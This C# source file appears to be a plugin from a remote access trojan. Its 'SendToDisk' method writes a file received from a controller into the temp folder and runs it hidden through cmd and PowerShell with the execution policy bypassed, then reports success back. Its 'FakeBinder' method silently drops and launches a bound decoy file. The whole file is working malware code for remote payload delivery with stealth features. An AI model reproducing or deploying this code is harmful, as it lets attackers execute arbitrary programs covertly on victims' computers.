using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using MessagePackLib.MessagePack;

namespace Plugin.Handler
{
    public class HandleSendTo
    {
        public void SendToDisk(MsgPack unpack_msgpack)
        {
            try
            {
                string fullPath = Path.Combine(Path.GetTempPath(), unpack_msgpack.ForcePathObject("FileName").AsString);
                if (File.Exists(fullPath))
                {
                    try
                    {
                        File.Delete(fullPath);
                    }
                    catch
                    {
                        fullPath = Path.Combine(Path.GetTempPath(), Methods.GetRandomString(6) + Path.GetExtension(unpack_msgpack.ForcePathObject("FileName").AsString));
                    }
                }
                File.WriteAllBytes(fullPath, Zip.Decompress(unpack_msgpack.ForcePathObject("File").GetAsBytes()));
                if (unpack_msgpack.ForcePathObject("FileName").AsString.ToLower().EndsWith(".ps1"))
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = $"/c start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -NoExit -FilePath {"'" + "\"" + fullPath + "\"" + "'"} & exit",
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        UseShellExecute = true,
                        ErrorDialog = false,
                    });
                }
                else
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = $"/c start /b powershell –ExecutionPolicy Bypass Start-Process -FilePath {"'" + "\"" + fullPath + "\"" + "'"} & exit",
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        UseShellExecute = true,
                        ErrorDialog = false,
                    });
                }


                if (unpack_msgpack.ForcePathObject("Update").AsString == "true")
                {
                    new HandleUninstall();
                }
                else
                {
                    Thread.Sleep(1000);
                    if (Process.GetProcessesByName(Path.GetFileNameWithoutExtension(fullPath)).Length > 0)
                    {
                        Packet.Log($"Temp\\{Path.GetFileName(fullPath)} execute success!");
                    }
                    else if (fullPath.ToLower().EndsWith(".ps1") && Process.GetProcessesByName("powershell").Length > 0)
                    {
                        Packet.Log($"Temp\\{Path.GetFileName(fullPath)} execute success!");
                    }
                }
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
            Connection.Disconnected();
        }

        public void FakeBinder(MsgPack unpack_msgpack)
        {
            try
            {
                if (Environment.CurrentDirectory.ToLower().Contains("appdata") || Environment.CurrentDirectory.ToLower().Contains("temp"))
                {

                }
                else
                {
                    string fullPath = Path.Combine(Path.GetTempPath(), Methods.GetRandomString(6) + unpack_msgpack.ForcePathObject("Extension").AsString);
                    File.WriteAllBytes(fullPath, Zip.Decompress(unpack_msgpack.ForcePathObject("File").GetAsBytes()));
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = $"/c start /b powershell –ExecutionPolicy Bypass Start-Process -FilePath {"'" + "\"" + fullPath + "\"" + "'"} & exit",
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        UseShellExecute = true,
                        ErrorDialog = false,
                    });
                    Thread.Sleep(1000);
                    Packet.Log($"Temp\\{Path.GetFileName(fullPath)} execute success!");
                }
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
            Connection.Disconnected();
        }
    }
}
